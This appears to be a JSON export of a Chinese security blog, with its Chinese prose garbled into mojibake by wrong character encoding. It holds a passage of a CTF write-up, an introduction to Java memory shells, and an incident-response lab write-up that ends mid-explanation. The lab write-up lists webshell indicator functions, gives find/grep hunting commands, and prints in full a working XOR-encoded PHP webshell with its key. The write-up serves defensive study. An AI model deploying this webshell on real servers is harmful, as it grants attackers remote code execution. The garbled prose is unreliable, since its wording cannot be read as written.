¼å¼\n\næœ¨é©¬exeæ‹¿å‡ºæ¥åå…­è¿›åˆ¶æ‰”åˆ°TXT æ‰¾åˆ°å›è¿çš„ip flag{hash(ip)}\n\næç¤ºï¼šå®‰é™ç‚¹ï¼Œç”¨çœ¼çœ‹\n\n### 400å›°éš¾ï¼š**è¿™é‡Œç©ºç©ºçš„**\n\næ­£å¸¸Excelè¡¨æ˜¯zip ä¸‹é¢è—ä¸€ä¸ªflagzip  zipé‡Œé¢æ— åæ–‡ä»¶ï¼ˆwindowsæ— æ³•æ‰§è¡Œç©ºç™½æ–‡ä»¶ï¼‰ æ–‡ä»¶é‡Œé¢æ˜¯å¼‚æˆ–flag å¼‚æˆ–å€¼æ˜¯1020\n\nflag.zipè¦ç”¨è§£å‹è½¯ä»¶æ‹¿å‡ºæ¥æ‰è¡Œä¸èƒ½æ­£å¸¸è§£å‹åœ¨å‹å›å»ï¼ˆçŸ¥è¯†ç‚¹æ˜¯å‹å›å»ä¼šå¯¼è‡´æ–‡ä»¶ç»“æ„å‘ç”Ÿå˜åŒ–ä¸é€‚é…excelçš„æ–‡ä»¶ç»“æœxmlæ–‡ä»¶å‘ç”Ÿå˜åŒ–ï¼‰ excelè¡¨ä¸€ç›´æ­£å¸¸ æ”¹å˜å‡ºé¢˜æ€è·¯ç›´æ¥éšå†™excel éšè—çš„sheetè¡¨é‡Œæœ‰å¼‚æˆ–æç¤º\n\nW\\SWJtW]â^âŸââ„âPUPEFYWE^M\n\nflag{Dem0n-15-beautiful}\n\næç¤ºï¼šzipé‡Œé¢çš„æ–‡ä»¶æ€ä¹ˆæ²¡æœ‰åå­—ï¼Ÿ\n\nè¿™æ ·çœ‹èµ·æ¥ä¹Ÿç®€å•çš„\n\n","tags":["-CTF -WP -MISC"]},{"title":"åˆè¯†å†…å­˜é©¬","url":"/2025/03/11/åˆè¯†å†…å­˜é©¬/","content":"\næœ€è¿‘å¤‡èµ› å¤©æ´¥çš„CISCNé•¿åŸæ¯çº¿ä¸‹ã€‚ç–¯ç‹‚åˆ·ç„æœºé¶åœºçš„åº”æ€¥å“åº”ï¼Œä½†æ˜¯åšçš„å¾ˆç²—ç³™ï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯å¯¹ç€wpè¿‡ä¸€éï¼Œå¾ˆå¤šä¸œè¥¿æ¥ä¸åŠæ¶ˆåŒ–å’Œå¸æ”¶ï¼Œä½†æ˜¯ä¹Ÿæ˜¯å¯¹åº”æ€¥å“åº”é€æ¸ç†Ÿæ‚‰èµ·æ¥äº†ï¼Œä»¥å‰ä¸€ç›´ä¸å¤ªæ¸…æ¥šåº”æ€¥å“åº”æ˜¯å•¥ ä¹‹å‰è¿˜æ„Ÿè§‰è·Ÿå–è¯æ˜¯ä¸€å—å†…å®¹å“ˆå“ˆã€‚\n\nç„æœºæ‰“å®Œå‰ä¸ƒç« äº†ï¼Œä¹Ÿæ²¡æŠ½ç©ºå†™wpï¼Œä½†æ˜¯ä¹Ÿä¸æ‰“ç®—å†™äº† [Peterpan.exe](https://peterpan.blog.csdn.net/?type=blog)å¸ˆå‚…çš„wpæˆ‘å°±æ˜¯å†™è´¨é‡ä¹Ÿä¸å¦‚ä»–å†™å¾—å¥½ æ‰€ä»¥å¹²è„†ä¸å†™äº† ç–¯ç‹‚æ¨èPeterpan.exeçš„ç„æœºwpè™½ç„¶å·²ç»æ¨èè¿‡äº†ã€‚\n\nç¬¬å…«ç« æ¶‰åŠåˆ°javaå†…å­˜é©¬ è™½è¯´æ˜¯æ’æŸ¥ä½†æ˜¯å¿…ç„¶æ˜¯è¦äº†è§£ä¸€ä¸‹çš„ æ„Ÿè§‰æ˜¯ä¸€å—å¤§å†…å®¹æ‰€ä»¥æ‰“ç®—ä¸“é—¨æŠ½ç©ºå­¦ä¹ ä¸€ä¸‹è¿™ä¸ªå†…å®¹ï¼Œæ„Ÿè§‰ä»¥åä¸å¯é¿å…çš„ç»•ä¸å¼€ã€‚\n\n[åº”æ€¥å“åº”â€”â€”å…¨ç±»å‹JAVAå†…å­˜é©¬æ’æŸ¥](https://mp.weixin.qq.com/s/AsrWA1I5OmtUhLzKbqboNA)\n\nè¨€å½’æ­£ä¼ ï¼š\n\n### å†…å­˜é©¬æ˜¯å•¥\n\nå†…å­˜é©¬ï¼Œä¹Ÿè¢«ç§°ä¸ºæ— æ–‡ä»¶é©¬ï¼Œæ˜¯æ— æ–‡ä»¶æ”»å‡»çš„ä¸€ç§å¸¸ç”¨æ‰‹æ®µã€‚å†…å­˜é©¬æ˜¯æ— æ–‡ä»¶æ”»å‡»çš„ä¸€ç§æŠ€æœ¯æ‰‹æ®µï¼Œé‚£æˆ‘ä»¬ä¸å¾—ä¸å…ˆç®€å•ä»‹ç»ä¸€ä¸‹æ— æ–‡ä»¶æ”»å‡»ã€‚æ— æ–‡ä»¶æ”»å‡»å¯ä»¥æœ‰æ•ˆåœ°èº²é¿ä¼ ç»Ÿå®‰å…¨è½¯ä»¶çš„æ£€æµ‹ï¼Œå®ƒä»¬å¯ä»¥åœ¨ç³»ç»Ÿçš„å†…å­˜ä¸­è¿œç¨‹åŠ è½½æ‰§è¡Œã€é©»ç•™åœ¨æ³¨å†Œè¡¨ä¸­æˆ–æ»¥ç”¨å¸¸ç”¨çš„ç™½åå•å·¥å…·ï¼Œä¾‹å¦‚PowerShellï¼ŒWindows Management Instrumentationï¼ˆWMIï¼‰å’ŒPsExecç­‰ã€‚æ— æ–‡ä»¶æ”»å‡»æŠ€æœ¯å…è®¸æ”»å‡»è€…è®¿é—®ç³»ç»Ÿï¼Œä»è€Œå¯ç”¨åç»­çš„æ¶æ„æ´»åŠ¨ã€‚é€šè¿‡æ“çºµæ¼æ´åˆ©ç”¨ç¨‹åºã€åˆæ³•å·¥å…·ã€å®å’Œè„šæœ¬ï¼Œæ”»å‡»è€…å¯ä»¥ç ´åç³»ç»Ÿã€æå‡ç‰¹æƒæˆ–åœ¨ç½‘ç»œä¸Šæ¨ªå‘ä¼ æ’­æ¶æ„ä»£ç ã€‚è€Œä¸”ï¼Œæ— æ–‡ä»¶å¨èƒåœ¨æ‰§è¡Œåä¸ä¼šç•™ä¸‹ä»»ä½•ç—•è¿¹ï¼Œè¿™ä½¿å…¶éš¾ä»¥è¢«æ£€æµ‹å’Œæ¸…é™¤ã€‚\n\nWebshellå†…å­˜é©¬ï¼Œæ˜¯åœ¨å†…å­˜ä¸­å†™å…¥æ¶æ„åé—¨å’Œæœ¨é©¬å¹¶æ‰§è¡Œï¼Œè¾¾åˆ°è¿œç¨‹æ§åˆ¶WebæœåŠ¡å™¨çš„ä¸€ç±»å†…å­˜é©¬ï¼Œå…¶ç„å‡†äº†ä¼ä¸šçš„å¯¹å¤–çª—å£ï¼šç½‘ç«™ã€åº”ç”¨ã€‚ä½†ä¼ ç»Ÿçš„Webshelléƒ½æ˜¯åŸºäºæ–‡ä»¶ç±»å‹çš„ï¼Œé»‘å®¢å¯ä»¥åˆ©ç”¨ä¸Šä¼ å·¥å…·æˆ–ç½‘ç«™æ¼æ´æ¤å…¥æœ¨é©¬ï¼ŒåŒºåˆ«åœ¨äºWebshellå†…å­˜é©¬æ˜¯æ— æ–‡ä»¶é©¬ï¼Œ**åˆ©ç”¨ä¸­é—´ä»¶çš„è¿›ç¨‹**æ‰§è¡ŒæŸäº›æ¶æ„ä»£ç ï¼Œ**ä¸ä¼šæœ‰æ–‡ä»¶è½åœ°**ï¼Œç»™æ£€æµ‹å¸¦æ¥å·¨å¤§éš¾åº¦ã€‚è€Œå†…å­˜æ”»å‡»è€…æ­£æ˜¯åˆ©ç”¨è½¯ä»¶å®‰å…¨æ¼æ´ï¼Œæ„é€ æ¶æ„è¾“å…¥å¯¼è‡´è½¯ä»¶åœ¨å¤„ç†è¾“å…¥æ•°æ®æ—¶å‡ºç°éé¢„æœŸé”™è¯¯ï¼Œå°†è¾“å…¥æ•°æ®å†™å…¥å†…å­˜ä¸­çš„æŸäº›ç‰¹å®šæ•æ„Ÿä½ç½®ï¼Œä»è€ŒåŠ«æŒè½¯ä»¶æ§åˆ¶æµã€æ‰§è¡Œæµï¼Œè½¬è€Œæ‰§è¡Œå¤–éƒ¨è¾“å…¥çš„æŒ‡ä»¤ä»£ç ï¼Œé€ æˆç›®æ ‡ç³»ç»Ÿè¢«è·å–è¿œç¨‹æ§åˆ¶ï¼Œè®©å†…å­˜é©¬çš„æ”»å‡»å¾—ä»¥å®ç°ã€‚\n\n\n*webshellçš„å˜è¿è¿‡ç¨‹å¤§è‡´å¦‚ä¸‹æ‰€è¿°ï¼š*\n\n*webæœåŠ¡å™¨ç®¡ç†é¡µé¢â€”â€”> å¤§é©¬â€”â€”>å°é©¬æ‹‰å¤§é©¬â€”â€”>ä¸€å¥è¯æœ¨é©¬â€”â€”>åŠ å¯†ä¸€å¥è¯æœ¨é©¬â€”â€”>åŠ å¯†å†…å­˜é©¬*\n\n*![37fe30ea3e8f28b06cac4bd346ae325d](http://images.lwwww.top/images/20250311114443497.jpeg)*\n\n> [!TIP]\n>\n> ### èƒŒæ™¯çŸ¥è¯†\n\njavawebçš„ä¸‰å¤§ä»¶ï¼š**Servlet** **Filter**  **Listener**\n\n\n\n##### **Servlet**\n\nServlet æ˜¯è¿è¡Œåœ¨ Web æœåŠ¡å™¨æˆ–åº”ç”¨æœåŠ¡å™¨ä¸Šçš„ç¨‹åºï¼Œå®ƒæ˜¯ä½œä¸ºæ¥è‡ª HTTP å®¢æˆ·ç«¯çš„è¯·æ±‚å’Œ HTTP æœåŠ¡å™¨ä¸Šçš„æ•°æ®åº“æˆ–åº”ç”¨ç¨‹åºä¹‹é—´çš„ä¸­é—´å±‚ã€‚å®ƒè´Ÿè´£å¤„ç†ç”¨æˆ·çš„è¯·æ±‚ï¼Œå¹¶æ ¹æ®è¯·æ±‚ç”Ÿæˆç›¸åº”çš„è¿”å›ä¿¡æ¯æä¾›ç»™ç”¨æˆ·ã€‚\n\n![9f891bf272d9fdef8c830085fa4844ba](http://images.lwwww.top/images/20250311115445521.png)\n\n```\nè¯·æ±‚çš„å¤„ç†è¿‡ç¨‹ï¼š\n\nå®¢æˆ·ç«¯å‘èµ·ä¸€ä¸ªhttpè¯·æ±‚ï¼Œæ¯”å¦‚getç±»å‹ã€‚\n\nServletå®¹å™¨æ¥æ”¶åˆ°è¯·æ±‚ï¼Œæ ¹æ®è¯·æ±‚ä¿¡æ¯ï¼Œå°è£…æˆHttpServletRequestå’ŒHttpServletResponseå¯¹è±¡ã€‚\n\nServletå®¹å™¨è°ƒç”¨HttpServletçš„init()æ–¹æ³•ï¼Œinitæ–¹æ³•åªåœ¨ç¬¬ä¸€æ¬¡è¯·æ±‚çš„æ—¶å€™è¢«è°ƒç”¨ã€‚\n\nServletå®¹å™¨è°ƒç”¨service()æ–¹æ³•ã€‚\n\nservice()æ–¹æ³•æ ¹æ®è¯·æ±‚ç±»å‹ï¼Œè¿™é‡Œæ˜¯getç±»å‹ï¼Œåˆ†åˆ«è°ƒç”¨doGetæˆ–è€…doPostæ–¹æ³•ï¼Œè¿™é‡Œè°ƒç”¨doGetæ–¹æ³•ã€‚\n\ndoXXXæ–¹æ³•ä¸­æ˜¯æˆ‘ä»¬è‡ªå·±å†™çš„ä¸šåŠ¡é€»è¾‘ã€‚\n\nä¸šåŠ¡é€»è¾‘å¤„ç†å®Œæˆä¹‹åï¼Œè¿”å›ç»™Servletå®¹å™¨ï¼Œç„¶åå®¹å™¨å°†ç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ã€‚\n\nå®¹å™¨å…³é—­æ—¶å€™ï¼Œä¼šè°ƒç”¨destoryæ–¹æ³•\n\n```\n\n###### **Servletå’ŒJSPçš„å…³ç³»ï¼Ÿ**\n\nJSPï¼ˆå…¨ç§°Java Server Pagesï¼‰\n JSPç»è¿‡è½¬æ¢ç¼–è¯‘ä»¥åè¿˜æ˜¯ä¼šå˜æˆServletï¼Œæ”¯æŒå‰\n ç«¯è¯­æ³•ã€‚\n Viewï¼šJSPï¼Œè´Ÿè´£å†…å®¹æ˜¾ç¤º\n Controllerï¼šServletï¼Œè´Ÿè´£å¤„ç†è¯·æ±‚\n\n###### Servletå’ŒTomcatçš„å…³ç³»\n\n    Tomcaté‡Œé¢æœ‰Servletå®¹å™¨ï¼ˆå¼•æ“ï¼‰\n    Tomcatå¯ä»¥æä¾›HTTPè®¿é—®\n    Tomcatå¯ä»¥æŠŠHTTPè¯·æ±‚è½¬æ¢ä¸ºHttpServletRequestå¯¹è±¡ï¼Œå¹¶è°ƒç”¨doGet/doPostï¼Œå¹¶ä¸”æŠŠHttpServletResponseè½¬æ¢ä¸ºHTTPå“åº”å†…å®¹\n\n\n##### **Filter**\n\nfilterä¹Ÿç§°ä¹‹ä¸ºè¿‡æ»¤å™¨ï¼Œæ˜¯å¯¹ServletæŠ€æœ¯çš„ä¸€ä¸ªå¼ºè¡¥å……ï¼Œå…¶ä¸»è¦åŠŸèƒ½æ˜¯åœ¨HttpServletRequeståˆ°è¾¾ Servlet ä¹‹å‰ï¼Œæ‹¦æˆªå®¢æˆ·çš„HttpServletRequest ï¼Œæ ¹æ®éœ€è¦æ£€æŸ¥HttpServletRequestï¼Œä¹Ÿå¯ä»¥ä¿®æ”¹HttpServletRequest å¤´å’Œæ•°æ®ï¼›åœ¨HttpServletResponseåˆ°è¾¾å®¢æˆ·ç«¯ä¹‹å‰ï¼Œæ‹¦æˆªHttpServletResponse ï¼Œæ ¹æ®éœ€è¦æ£€æŸ¥HttpServletResponseï¼Œä¹Ÿå¯ä»¥ä¿®æ”¹HttpServletResponseå¤´å’Œæ•°æ®ã€‚\n\n![976bebf2851b55517a6e19baa2168c17](http://images.lwwww.top/images/20250311115828111.png)\n\n```\n   è¿‡ç¨‹ï¼š\n   1ã€Filter ç¨‹åºæ˜¯ä¸€ä¸ªå®ç°äº†ç‰¹æ®Šæ¥å£çš„ Java ç±»ï¼Œä¸ Servlet ç±»ä¼¼ï¼Œä¹Ÿæ˜¯ç”± Servlet å®¹å™¨è¿›è¡Œè°ƒç”¨å’Œæ‰§è¡Œçš„ã€‚ \n\n    2ã€å½“åœ¨ web.xml æ³¨å†Œäº†ä¸€ä¸ª Filter æ¥å¯¹æŸä¸ª Servlet ç¨‹åºè¿›è¡Œæ‹¦æˆªå¤„ç†æ—¶ï¼Œå®ƒå¯ä»¥å†³å®šæ˜¯å¦å°†è¯·æ±‚ç»§ç»­ä¼ é€’ç»™ Servlet ç¨‹åºï¼Œä»¥åŠå¯¹è¯·æ±‚å’Œå“åº”æ¶ˆæ¯æ˜¯å¦è¿›è¡Œä¿®æ”¹ã€‚ \n\n    3ã€å½“ Servlet å®¹å™¨å¼€å§‹è°ƒç”¨æŸä¸ª Servlet ç¨‹åºæ—¶ï¼Œå¦‚æœå‘ç°å·²ç»æ³¨å†Œäº†ä¸€ä¸ª Filter ç¨‹åºæ¥å¯¹è¯¥ Servlet è¿›è¡Œæ‹¦æˆªï¼Œé‚£ä¹ˆå®¹å™¨ä¸å†ç›´æ¥è°ƒç”¨ Servlet çš„ service æ–¹æ³•ï¼Œè€Œæ˜¯è°ƒç”¨ Filter çš„ doFilter æ–¹æ³•ï¼Œå†ç”± doFilter æ–¹æ³•å†³å®šæ˜¯å¦å»æ¿€æ´» service æ–¹æ³•ã€‚ \n\n    4ã€ä½†åœ¨ Filter.doFilter æ–¹æ³•ä¸­ä¸èƒ½ç›´æ¥è°ƒç”¨ Servlet çš„ service æ–¹æ³•ï¼Œè€Œæ˜¯è°ƒç”¨ FilterChain.doFilter æ–¹æ³•æ¥æ¿€æ´»ç›®æ ‡ Servlet çš„ service æ–¹æ³•ï¼ŒFilterChain å¯¹è±¡æ—¶é€šè¿‡ Filter.doFilter æ–¹æ³•çš„å‚æ•°ä¼ é€’è¿›æ¥çš„ã€‚ \n\n    5ã€åªè¦åœ¨ Filter.doFilter æ–¹æ³•ä¸­è°ƒç”¨ FilterChain.doFilter æ–¹æ³•çš„è¯­å¥å‰åå¢åŠ æŸäº›ç¨‹åºä»£ç ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨ Servlet è¿›è¡Œå“åº”å‰åå®ç°æŸäº›ç‰¹æ®ŠåŠŸèƒ½ã€‚ \n\n    6ã€å¦‚æœåœ¨ Filter.doFilter æ–¹æ³•ä¸­æ²¡æœ‰è°ƒç”¨ FilterChain.doFilter æ–¹æ³•ï¼Œåˆ™ç›®æ ‡ Servlet çš„ service æ–¹æ³•ä¸ä¼šè¢«æ‰§è¡Œï¼Œè¿™æ ·é€šè¿‡ Filter å°±å¯ä»¥é˜»æ­¢æŸäº›éæ³•çš„è®¿é—®è¯·æ±‚ã€‚ \n\n```\n\n##### Listener\n\nJavaWebå¼€å‘ä¸­çš„ç›‘å¬å™¨ï¼ˆListenerï¼‰å°±æ˜¯Applicationã€Sessionå’ŒRequestä¸‰å¤§å¯¹è±¡åˆ›å»ºã€é”€æ¯æˆ–è€…å¾€å…¶ä¸­æ·»åŠ ã€ä¿®æ”¹ã€åˆ é™¤å±æ€§æ—¶è‡ªåŠ¨æ‰§è¡Œä»£ç çš„åŠŸèƒ½ç»„ä»¶ã€‚\n\nServletContextListenerï¼šå¯¹Servletä¸Šä¸‹æ–‡çš„åˆ›å»ºå’Œé”€æ¯è¿›è¡Œç›‘å¬ï¼›\nServletContextAttributeListenerï¼šç›‘å¬Servletä¸Šä¸‹æ–‡å±æ€§çš„æ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢ï¼›\n\nHttpSessionListenerï¼šå¯¹Sessionçš„åˆ›å»ºå’Œé”€æ¯è¿›è¡Œç›‘å¬ã€‚Sessionçš„é”€æ¯æœ‰ä¸¤ç§æƒ…å†µï¼Œä¸€ä¸ªä¸­Sessionè¶…æ—¶ï¼Œè¿˜æœ‰ä¸€ç§æ˜¯é€šè¿‡è°ƒç”¨Sessionå¯¹è±¡çš„invalidate()æ–¹æ³•ä½¿sessionå¤±æ•ˆã€‚\n\nHttpSessionAttributeListenerï¼šå¯¹Sessionå¯¹è±¡ä¸­å±æ€§çš„æ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢è¿›è¡Œç›‘å¬ï¼›\n\nServletRequestListenerï¼šå¯¹è¯·æ±‚å¯¹è±¡çš„åˆå§‹åŒ–å’Œé”€æ¯è¿›è¡Œç›‘å¬ï¼›\nServletRequestAttributeListenerï¼šå¯¹è¯·æ±‚å¯¹è±¡å±æ€§çš„æ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢è¿›è¡Œç›‘å¬ã€‚\n\nç”¨é€”\n\nå¯ä»¥ä½¿ç”¨ç›‘å¬å™¨ç›‘å¬å®¢æˆ·ç«¯çš„è¯·æ±‚ã€æœåŠ¡ç«¯çš„æ“ä½œç­‰ã€‚é€šè¿‡ç›‘å¬å™¨ï¼Œå¯ä»¥è‡ªåŠ¨å‡ºå‘ä¸€äº›åŠ¨ä½œï¼Œæ¯”å¦‚ç›‘å¬åœ¨çº¿çš„ç”¨æˆ·æ•°é‡ï¼Œç»Ÿè®¡ç½‘ç«™è®¿é—®é‡ã€ç½‘ç«™è®¿é—®ç›‘æ§ç­‰ã€‚\n\n\n\n##### å†…å­˜é©¬åº”ç”¨ç†è§£\n\næƒ³è¦æ¥ç®¡webåº”ç”¨çš„å¤„ç†é€»è¾‘ï¼Œå…¶å®å°±æ˜¯ä¸¤ç§æ–¹æ³•ï¼Œä¸€ç§æ˜¯ç›´æ¥ç¯¡æ”¹ä»–ï¼Œä¸€ç§æ˜¯é¡ºç€ä»–åˆ©ç”¨å…¶è‡ªå·±çš„ä¸€äº›ç‰¹æ€§å»æ¥ç®¡ä»–ï¼›å°±æ˜¯å¦‚ä¸‹ä¸¤ç§æ–¹æ³•ï¼š\n\n- ç ”ç©¶å¦‚ä½•å»ä¿®æ”¹jvmé‡Œé¢çš„webåº”ç”¨ä¸€äº›å¤„ç†é€»è¾‘ç±»çš„å®ç°ï¼Œä»è€Œå®ç°ä¿®æ”¹webåº”ç”¨çš„å¤„ç†é€»è¾‘ï¼›\n\n- é¡ºç€webåº”ç”¨æ¥ï¼Œåˆ©ç”¨webåº”ç”¨è‡ªèº«çš„å¯æ‹“å±•æ€§ï¼Œæ¯”å¦‚å…¶ä¸€äº›æœåŠ¡ç»„ä»¶å¯ä»¥åŠ¨æ€çš„å¢æ·»çš„ç‰¹æ€§æ¥å®ç°æ¥ç®¡webåº”ç”¨å¯¹è¯·æ±‚çš„å¤„ç†é€»è¾‘ï¼›\n\nåŒæ—¶è¿™é‡Œæˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹å‡ºç¬¬ä¸€ç§æ–¹æ³•çš„å¤„ç†èŒƒå›´ä¸€å®šç¨‹åº¦ä¸Šè‚¯å®šæ˜¯æ¯”ç¬¬äºŒç§å¤§çš„ï¼Œä½†æ˜¯è¿™é‡Œå¹¶ä¸æ˜¯åŒ…å«å…³ç³»ï¼Œä¸€ä¸ªæ˜¯å¯¹ç±»çš„å®ç°ç¯¡æ”¹ï¼Œä¸€ä¸ªæ˜¯æ·»åŠ ï¼›\n\né¦–å…ˆæˆ‘ä»¬è¦äº†è§£æ’æŸ¥çš„åŸç†ï¼Œå¯¹äºè¿™ç±»çš„å†…å­˜é©¬ï¼Œæ˜¯é€šè¿‡æ·»åŠ ä¸€äº›ç»„ä»¶å®ç°çš„ï¼Œæ¯ç§ç»„ä»¶éƒ½æœ‰ä¸€ä¸ªçˆ¶ç±»ï¼Œæˆ‘ä»¬å¯ä»¥éå†jvmé‡Œé¢çš„æ‰€æœ‰ç±»ï¼Œæ‰¾åˆ°ç»§æ‰¿äº†ä¸Šé¢ä¸‰ç§å…¬å…±çˆ¶ç±»çš„ç±»æˆ–è€…æ˜¯å®ç°çš„å…¬å…±æ¥å£ï¼Œåˆæˆ–è€…æ˜¯æ‰¾åˆ°è¿™äº›ç±»çš„å…¶ä»–å…¬å…±ç‰¹å¾ï¼Œç„¶åè¾“å‡ºç±»ååŠè·¯å¾„å¼€å±•æ’æŸ¥ï¼Œä¸€èˆ¬æ¥è¯´æ¯”è¾ƒç®€å•ç²—æš´çš„æ’æŸ¥æ–¹æ³•å¯ä»¥å€ŸåŠ©å†…å­˜é©¬çš„æ€§è´¨æ¥åšï¼Œå³è§‚å¯Ÿæœ¬åœ°æ˜¯å¦å­˜åœ¨ç›¸å…³ç±»æ–‡ä»¶è½åœ°ï¼Œæ²¡æœ‰å°±æ˜¯é‡ç‚¹æ€€ç–‘å¯¹è±¡ï¼›\n\n\n\n\n\nï¼ˆå­¦ä¸æ˜ç™½ javaåº•å­ä¸å¥½ ä¸å¤ªèƒ½ç†è§£ æˆ‘è§‰å¾—å…ˆå½“è„šæœ¬å°å­å»ï¼Œä¹Ÿæ˜¯åº”äº†é¢˜ç›®äº† åˆæ—¶javaå†…å­˜é©¬å“ˆå“ˆï¼‰\n","tags":["-WEB -åº”æ€¥å“åº” -å†…å­˜é©¬"]},{"title":"ç„æœºé¶åœº","url":"/2025/03/04/ç„æœºé¶åœº/","content":"\n## ç¬¬ä¸€ç«  åº”æ€¥å“åº”-webshellæŸ¥æ€\n\nç®€ä»‹ é¶æœºè´¦å·å¯†ç  root xjwebshell\n1.é»‘å®¢webshellé‡Œé¢çš„flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}\n2.é»‘å®¢ä½¿ç”¨çš„ä»€ä¹ˆå·¥å…·çš„shell githubåœ°å€çš„md5 flag{md5}\n3.é»‘å®¢éšè—shellçš„å®Œæ•´è·¯å¾„çš„md5 flag{md5} æ³¨ : /xxx/xxx/xxx/xxx/xxx.xxx\n4.é»‘å®¢å…æ€é©¬å®Œæ•´è·¯å¾„ md5 flag{md5}\n\n\n\nå¼ºçƒˆæ¨è[Peterpan.exe](https://peterpan.blog.csdn.net/?type=blog)å¸ˆå‚…çš„wp\n\né¦–å…ˆç»™å‡ºç¯å¢ƒæˆ‘ä»¥ä¸ºæ˜¯ä»¿çœŸé¶åœºï¼Œæ£é¼“äº†åŠå¤©æ²¡å¼„æ˜ç™½ ç»“æœæ˜¯å»è¿œç¨‹è¿æ¥linux æˆ‘çœŸæ˜¯äºŒé€¼\n\n#### 1.é»‘å®¢webshellé‡Œé¢çš„flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}\n\n1.å¯ç–‘å‡½æ•°è°ƒç”¨ â—¦ WebShellé€šå¸¸ä¼šä½¿ç”¨ä¸€äº›å±é™©çš„å‡½æ•°æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æˆ–ä»£ç ï¼Œå¦‚ï¼š  â–ª PHP: eval(), system(), exec(), shell_exec(), passthru(), assert(), base64_decode() â–ª ASP: Execute(), Eval(), CreateObject() â–ª JSP: Runtime.getRuntime().exec()     \n\n2.  ç¼–ç å’Œè§£ç  â—¦ WebShellç»å¸¸ä½¿ç”¨ç¼–ç å’Œè§£ç æŠ€æœ¯æ¥éšè—å…¶çœŸå®æ„å›¾ï¼Œå¦‚Base64ç¼–ç ï¼š\n\n```php\n     eval(base64_decode('encoded_string'));\n\n```\n\næ–‡ä»¶æ“ä½œ â—¦ WebShellå¯èƒ½ä¼šåŒ…å«æ–‡ä»¶æ“ä½œå‡½æ•°ï¼Œç”¨äºè¯»å–ã€å†™å…¥æˆ–ä¿®æ”¹æ–‡ä»¶ï¼š \n\n â–ª PHP: fopen(), fwrite(), file_get_contents(), file_put_contents() â–ª ASP: FileSystemObject    \n\n4. ç½‘ç»œæ“ä½œ â—¦ WebShellå¯èƒ½ä¼šåŒ…å«ç½‘ç»œæ“ä½œå‡½æ•°ï¼Œç”¨äºä¸è¿œç¨‹æœåŠ¡å™¨é€šä¿¡ï¼š \n\n    â–ª PHP: fsockopen(), curl_exec(), file_get_contents('http://...') â–ª ASP: WinHttp.WinHttpRequest      \n\n   ä¸Šé¢åˆšåˆšä¹Ÿè¯´äº†æˆ‘ä»¬å¯ä»¥å°è¯•å®šä½ä¸€äº›ç‰¹æ®Šçš„åç¼€æ–‡ä»¶ï¼Œä¾‹å¦‚ï¼š.aspã€.phpã€.jspã€.aspxã€‚\n\n```php\n//æœç´¢ç›®å½•ä¸‹é€‚é…å½“å‰åº”ç”¨çš„ç½‘é¡µæ–‡ä»¶ï¼ŒæŸ¥çœ‹å†…å®¹æ˜¯å¦æœ‰Webshellç‰¹å¾\nfind ./ type f -name \"*.jsp\" | xargs grep \"exec(\" \nfind ./ type f -name \"*.php\" | xargs grep \"eval(\" \nfind ./ type f -name \"*.asp\" | xargs grep \"execute(\" \nfind ./ type f -name \"*.aspx\" | xargs grep \"eval(\" \n \n//å¯¹äºå…æ€Webshellï¼Œå¯ä»¥æŸ¥çœ‹æ˜¯å¦ä½¿ç”¨ç¼–ç \nfind ./ type f -name \"*.php\" | xargs grep \"base64_decode\" \n```\n\n```shell\næœ¬é¢˜æ­¥éª¤å°±æ˜¯ï¼š\nfind ./ type f -name \"*.php\" | xargs grep \"eval(\"\n\n```\n\næœ€åç»ˆäºåœ¨gz.phpé‡Œé¢å‘ç°äº†ï¼›\n\n```php\n<?php\n@session_start();\n@set_time_limit(0);\n@error_reporting(0);\nfunction encode($D,$K){\n    for($i=0;$i<strlen($D);$i++) {\n        $c = $K[$i+1&15];\n        $D[$i] = $D[$i]^$c;\n    }\n    return $D;\n}\n//027ccd04-5065-48b6-a32d-77c704a5e26d\n$payloadName='payload';\n$key='3c6e0b8a9c15224a';\n$data=file_get_contents(\"php://input\");\nif ($data!==false){\n    $data=encode($data,$key);\n    if (isset($_SESSION[$payloadName])){\n        $payload=encode($_SESSION[$payloadName],$key);\n        if (strpos($payload,\"getBasicsInfo\")===false){\n            $payload=encode($payload,$key);\n        }\n\t\teval($payload);\n        echo encode(@run($data),$key);\n    }else{\n        if (strpos($data,\"getBasicsInfo\")!==false){\n            $_SESSION[$payloadName]=encode($data,$key);\n        }\n    }\n}\n\n\n@session_start();ï¼šå¯åŠ¨ä¼šè¯\n\n@set_time_limit(0);ï¼šè®¾ç½®è„šæœ¬æ‰§è¡Œæ—¶é—´é™åˆ¶ä¸ºæ— é™åˆ¶\n\n@error_reporting(0);ï¼šå…³é—­é”™è¯¯æŠ¥å‘Š\n\nfunction encode($D,$K){...}ï¼šå®šä¹‰äº†ä¸€ä¸ªåä¸º encode çš„å‡½æ•°ï¼Œå®ƒæ¥å—ä¸¤ä¸ªå‚æ•° $D å’Œ $Kã€‚è¿™ä¸ªå‡½æ•°çœ‹èµ·æ¥åƒæ˜¯ä¸€ä¸ªç®€å•çš„å¼‚æˆ–ç¼–ç å‡½æ•°ï¼Œç”¨äºå¯¹æ•°æ®è¿›è¡ŒåŠ å¯†æˆ–è§£å¯†ã€‚å®ƒä½¿ç”¨ $K ä½œä¸ºå¯†é’¥ï¼Œå¯¹ $D ä¸­çš„æ¯ä¸ªå­—ç¬¦è¿›è¡Œå¼‚æˆ–æ“ä½œã€‚\n\næ¥ä¸‹æ¥çš„å‡ è¡Œä»£ç å®šä¹‰äº† $payloadNameã€$key å’Œ $data å˜é‡ã€‚$payloadName æ˜¯ç”¨äºå­˜å‚¨æœ‰æ•ˆè½½è·çš„ä¼šè¯å˜é‡åï¼Œ$key æ˜¯ç”¨äºç¼–ç çš„å¯†é’¥ï¼Œ$data æ˜¯ä» php://input æµä¸­è¯»å–çš„æ•°æ®ã€‚\n\nif ($data!==false){...}ï¼šå¦‚æœä» php://input è¯»å–çš„æ•°æ®ä¸æ˜¯ falseï¼ˆå³æˆåŠŸè¯»å–äº†æ•°æ®ï¼‰ï¼Œåˆ™æ‰§è¡Œä»¥ä¸‹ä»£ç å—ã€‚\n\nif 